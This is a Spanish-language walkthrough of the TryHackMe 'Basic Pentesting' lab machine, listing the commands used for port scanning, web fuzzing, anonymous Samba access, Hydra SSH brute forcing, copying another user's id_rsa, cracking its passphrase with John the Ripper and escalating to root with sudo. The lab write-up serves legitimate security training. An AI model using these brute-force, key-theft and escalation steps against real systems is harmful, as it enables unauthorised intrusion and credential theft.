---
tags:
  - Cybersecurity
  - TryHackMe
  - Linux
  - Samba
  - Hydra
  - Ssh
  - JohnTheRipper
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Smbclient|Smbclient]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#John The Ripper|John The Ripper]]
	- [[#Explotación#Sudo|Sudo]]

---
# Resolviendo la máquina "Basic Pentesting" de TryHackMe

> En esta publicación, comparto cómo resolví la máquina [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt) de [TryHackMe](https://tryhackme.com/). Es una excelente práctica para quienes están empezando en el mundo del _pentesting_, cubriendo etapas como enumeración, explotación y escalada de privilegios.

---
## Enumeración
### Ping

Se realiza un _ping_ para ver si tenemos conexión con la máquina, además de comprobar el sistema operativo con el que nos encontramos.

`ping -c 1 10.10.169.124`

![[Pasted image 20250708192343.png]]

*TTL=63* -> **Linux**
### Nmap

Se realiza un escaneo de puertos.

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.169.124 -oG allPorts`

![[Pasted image 20250708192615.png]]

`nmap -p22,80,139,445,8009,8080 -sCV 10.10.169.124 -oN targeted`

![[Pasted image 20250708192647.png]]
### Fuzzing Web

Se realiza **Fuzzing Web** para buscar directorios.

`gobuster dir -u http://10.10.169.124/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

![[Pasted image 20250708193835.png]]

Se encuentra el directorio: `http://10.10.169.124/development`.

![[Pasted image 20250708193849.png]]

![[Pasted image 20250708193902.png]]

![[Pasted image 20250708193912.png]]
## Explotación
### Smbclient

Se comprueba si el protocolo *SAMBA* tiene el acceso con usuario anónimo.

`smbclient -L 10.10.169.124 -N`

![[Pasted image 20250708194000.png]]

Se accede al protocolo *SAMBA* con el usuario anónimo y se descarga el archivo `staff.txt`.

`smbclient -N \\\\10.10.169.124\\Anonymous`

```
dir
get staff.txt
```

![[Pasted image 20250708194136.png]]

Se visualiza el contenido del archivo.

`cat staff.txt`

![[Pasted image 20250708194200.png]]
### Hydra

Se procede a realizar fuerza bruta mediante *Hydra*.

`hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.169.124`

![[Pasted image 20250708194900.png]]
### SSH

`ssh jan@10.10.169.124`

![[Pasted image 20250708195005.png]]

Se accede a la siguiente ruta: `/home/kay`

`ls -la`

![[Pasted image 20250708195956.png]]

Se observa que tenemos acceso a la carpeta *.ssh*. Además de poder visualizar la *id_rsa*.

`cd .ssh`

`ls -la`

![[Pasted image 20250708200027.png]]

`cat id_rsa`

![[Pasted image 20250708200108.png]]

Se copia la *id_rsa*.

`nano id_rsa`

Se dan los permisos necesarios.

`chmod 600 id_rsa`

Se vuelve a conectar mediante *ssh* y nos pide una frase.

`ssh kay@10.10.169.124 -i id_rsa`

![[Pasted image 20250708200230.png]]
### John The Ripper

Se procede a *crackear* la *id_rsa*.

`ssh2john id_rsa > id_john.txt`

`cat id_john.txt`

![[Pasted image 20250708200321.png]]

`john id_john.txt --wordlist=/usr/share/wordlists/rockyou.txt`

![[Pasted image 20250708200352.png]]

Se vuelve a conectar mediante *ssh* y se introduce la frase.

`ssh kay@10.10.169.124 -i id_rsa`

![[Pasted image 20250708200644.png]]

Se observa el archivo *pass.bak*.

`cat pass.bak`

![[Pasted image 20250708200929.png]]
### Sudo

Se introduce la contraseña del archivo *pass.bak*.

`sudo -l`

![[Pasted image 20250708201018.png]]

`sudo su`

![[Pasted image 20250708201046.png]]

---